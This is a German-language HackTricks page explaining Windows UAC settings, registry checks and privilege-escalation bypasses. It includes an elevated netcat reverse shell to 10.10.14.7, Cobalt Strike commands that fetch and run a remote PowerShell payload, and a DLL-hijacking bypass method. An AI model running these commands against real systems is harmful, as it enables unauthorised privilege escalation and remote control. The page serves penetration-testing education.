# UAC - Benutzerkontensteuerung

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Erhalten Sie heute Zugang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsmeldung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Level, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos** ausgeführt, es sei denn, ein Administrator autorisiert diese Anwendungen/Aufgaben ausdrücklich, um Administratorzugriff auf das System zu erhalten. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze betrachtet wird.

Für weitere Informationen zu Integritätsstufen:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wenn UAC aktiv ist, erhält ein Administratorkonto 2 Tokens: einen Standardbenutzer-Schlüssel, um reguläre Aktionen auf regulärem Niveau auszuführen, und einen mit Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) behandelt, wie UAC im Detail funktioniert und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC spezifisch für ihre Organisation auf lokaler Ebene (unter Verwendung von secpol.msc) funktioniert oder über Gruppenrichtlinienobjekte (GPO) in einer Active Directory-Domänenumgebung konfiguriert und bereitgestellt wird. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich besprochen. Es gibt 10 Gruppenrichtlinieneinstellungen, die für UAC festgelegt werden können. Die folgende Tabelle bietet zusätzliche Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel     | Standardeinstellung                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ---------------------------------------------------------- |
| [Benutzerkontensteuerung: Genehmigungsmodus für das integrierte Administratorkonto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                |
| [Benutzerkontensteuerung: UIAccess-Anwendungen erlauben, ohne Verwendung des sicheren Desktops zur Erhöhung aufzufordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsmeldung für Administratoren im Genehmigungsmodus](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Aufforderung zur Zustimmung für Nicht-Windows-Binärdateien |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsmeldung für Standardbenutzer](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Aufforderung zur Eingabe von Anmeldeinformationen auf dem sicheren Desktop |
| [Benutzerkontensteuerung: Anwendung von Installationen erkennen und zur Erhöhung auffordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Enterprise) |
| [Benutzerkontensteuerung: Nur ausführbare Dateien erhöhen, die signiert und validiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                |
| [Benutzerkontensteuerung: Nur UIAccess-Anwendungen erhöhen, die an sicheren Orten installiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                  |
| [Benutzerkontensteuerung: Alle Administratoren im Genehmigungsmodus ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                  |
| [Benutzerkontensteuerung: Zum sicheren Desktop wechseln, wenn zur Erhöhung aufgefordert wird](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                  |
| [Benutzerkontensteuerung: Virtualisieren von Datei- und Registrierungsschreibfehlern auf benutzerspezifische Standorte](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                  |

### UAC Bypass-Theorie

Einige Programme werden **automatisch erhöht**, wenn der **Benutzer zur** **Administratorgruppe** gehört. Diese Binärdateien haben in ihren _**Manifests**_ die _**autoElevate**_-Option mit dem Wert _**True**_. Die Binärdatei muss auch **von Microsoft signiert** sein.

Um die **UAC** (von **mittlerem** Integritätslevel **zu hoch**) zu **umgehen**, verwenden einige Angreifer diese Art von Binärdateien, um **beliebigen Code auszuführen**, da er von einem **Prozess mit hohem Integritätslevel** ausgeführt wird.

Sie können das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals **überprüfen**. Und Sie können das **Integritätslevel** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) **sehen**.

### UAC überprüfen

Um zu bestätigen, ob UAC aktiviert ist, führen Sie Folgendes aus:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, wenn es **`0`** ist oder **nicht existiert**, dann ist UAC **inaktiv**.

Überprüfen Sie dann, **welches Niveau** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Wenn **`0`** dann wird UAC nicht auffordern (wie **deaktiviert**)
* Wenn **`1`** wird der Administrator **nach Benutzername und Passwort** gefragt, um die Binärdatei mit hohen Rechten auszuführen (auf Secure Desktop)
* Wenn **`2`** (**Immer benachrichtigen**) wird UAC immer um Bestätigung des Administrators bitten, wenn er versucht, etwas mit hohen Rechten auszuführen (auf Secure Desktop)
* Wenn **`3`** wie `1`, aber nicht unbedingt auf Secure Desktop
* Wenn **`4`** wie `2`, aber nicht unbedingt auf Secure Desktop
* wenn **`5`**(**Standard**) wird der Administrator um Bestätigung gebeten, um nicht Windows-Binärdateien mit hohen Rechten auszuführen

Dann müssen Sie den Wert von **`LocalAccountTokenFilterPolicy`** überprüfen\
Wenn der Wert **`0`** ist, dann kann nur der **RID 500** Benutzer (**eingebauter Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn es `1` ist, können **alle Konten in der Gruppe "Administratoren"** dies tun.

Und schließlich überprüfen Sie den Wert des Schlüssels **`FilterAdministratorToken`**\
Wenn **`0`** (Standard), kann das **eingebaute Administratorkonto** Remote-Administrationsaufgaben durchführen und wenn **`1`** kann das eingebaute Administratorkonto **nicht** Remote-Administrationsaufgaben durchführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

* Wenn `EnableLUA=0` oder **nicht existiert**, **kein UAC für niemanden**
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=1`, kein UAC für niemanden**
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=0`, kein UAC für RID 500 (eingebauter Administrator)**
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=1`, UAC für alle**

All diese Informationen können mit dem **metasploit** Modul: `post/windows/gather/win_privs` gesammelt werden

Sie können auch die Gruppen Ihres Benutzers überprüfen und das Integritätsniveau abrufen:
```
net user %username%
whoami /groups | findstr Level
```
## UAC-Umgehung

{% hint style="info" %}
Beachten Sie, dass die UAC-Umgehung einfach ist, wenn Sie grafischen Zugriff auf das Opfer haben, da Sie einfach auf "Ja" klicken können, wenn die UAC-Eingabeaufforderung erscheint.
{% endhint %}

Die UAC-Umgehung ist in der folgenden Situation erforderlich: **die UAC ist aktiviert, Ihr Prozess läuft in einem Medium-Integritätskontext, und Ihr Benutzer gehört zur Administratorgruppe**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, die UAC zu umgehen, wenn sie auf dem höchsten Sicherheitsniveau (Immer) ist, als wenn sie auf einem der anderen Niveaus (Standard) ist.**

### UAC deaktiviert

Wenn die UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), können Sie **eine Reverse-Shell mit Administratorrechten** (hoher Integritätslevel) mit etwas wie:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC-Umgehung mit Token-Duplikation

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegende UAC "Umgehung" (voller Zugriff auf das Dateisystem)

Wenn Sie eine Shell mit einem Benutzer haben, der in der Gruppe der Administratoren ist, können Sie **C$** über SMB (Dateisystem) lokal in einem neuen Laufwerk **einbinden** und Sie haben **Zugriff auf alles im Dateisystem** (sogar auf den Administrator-Hauptordner).

{% hint style="warning" %}
**Es scheint, dass dieser Trick nicht mehr funktioniert**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-Umgehung mit Cobalt Strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf dem maximalen Sicherheitsniveau eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben auch mehrere Module, um die **UAC** zu **umgehen**.

### KRBUACBypass

Dokumentation und Tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Umgehungs-Exploits

[**UACME** ](https://github.com/hfiref0x/UACME), das eine **Kompilation** mehrerer UAC-Umgehungs-Exploits ist. Beachten Sie, dass Sie **UACME mit Visual Studio oder MSBuild kompilieren müssen**. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`), Sie müssen wissen, **welche Sie benötigen.**\
Seien Sie **vorsichtig**, da einige Umgehungen **andere Programme auffordern**, die den **Benutzer** **warnen**, dass etwas passiert.

UACME hat die **Build-Version, ab der jede Technik zu funktionieren begann**. Sie können nach einer Technik suchen, die Ihre Versionen betrifft:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Auch mit [dieser](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) Seite erhalten Sie die Windows-Version `1607` aus den Build-Versionen.

#### Weitere UAC-Umgehungen

**Alle** hier verwendeten Techniken zur Umgehung von AUC **erfordern** eine **vollständige interaktive Shell** mit dem Opfer (eine gängige nc.exe-Shell reicht nicht aus).

Sie können eine **meterpreter**-Sitzung verwenden. Migrieren Sie zu einem **Prozess**, der den **Session**-Wert gleich **1** hat:

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC-Umgehung mit GUI

Wenn Sie Zugriff auf eine **GUI haben, können Sie einfach die UAC-Aufforderung akzeptieren**, wenn Sie sie erhalten, Sie benötigen wirklich keine Umgehung. Der Zugriff auf eine GUI ermöglicht es Ihnen, die UAC zu umgehen.

Darüber hinaus, wenn Sie eine GUI-Sitzung erhalten, die jemand verwendet hat (möglicherweise über RDP), gibt es **einige Tools, die als Administrator ausgeführt werden**, von denen aus Sie beispielsweise **cmd** direkt **als Admin** ausführen können, ohne erneut von UAC aufgefordert zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **stealthy** sein.

### Lauter Brute-Force-UAC-Umgehung

Wenn es Ihnen nichts ausmacht, laut zu sein, könnten Sie immer **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen, das nach einer Erhöhung der Berechtigungen fragt, bis der Benutzer es akzeptiert**.

### Ihre eigene Umgehung - Grundlegende UAC-Umgehungsmethodik

Wenn Sie sich **UACME** ansehen, werden Sie feststellen, dass **die meisten UAC-Umgehungen eine Dll-Hijacking-Schwachstelle ausnutzen** (hauptsächlich das Schreiben der bösartigen dll in _C:\Windows\System32_). [Lesen Sie dies, um zu lernen, wie man eine Dll-Hijacking-Schwachstelle findet](../windows-local-privilege-escalation/dll-hijacking/).

1. Finden Sie eine Binärdatei, die **autoelevate** (prüfen Sie, dass sie beim Ausführen auf einem hohen Integritätslevel läuft).
2. Verwenden Sie procmon, um "**NAME NOT FOUND**"-Ereignisse zu finden, die anfällig für **DLL Hijacking** sein können.
3. Sie müssen wahrscheinlich die DLL in einige **geschützte Pfade** (wie C:\Windows\System32) schreiben, in denen Sie keine Schreibberechtigungen haben. Sie können dies umgehen, indem Sie:
   1. **wusa.exe**: Windows 7, 8 und 8.1. Es ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (da dieses Tool von einem hohen Integritätslevel ausgeführt wird).
   2. **IFileOperation**: Windows 10.
4. Bereiten Sie ein **Skript** vor, um Ihre DLL in den geschützten Pfad zu kopieren und die anfällige und autoelevierte Binärdatei auszuführen.

### Eine weitere UAC-Umgehungstechnik

Besteht darin zu beobachten, ob eine **autoElevated Binärdatei** versucht, aus der **Registry** den **Namen/Pfad** einer **Binärdatei** oder **Befehls** zu **lesen**, die **ausgeführt** werden soll (dies ist interessanter, wenn die Binärdatei diese Informationen innerhalb des **HKCU** sucht).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows zu erstellen und zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterstützen</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden. 

</details>
{% endhint %}
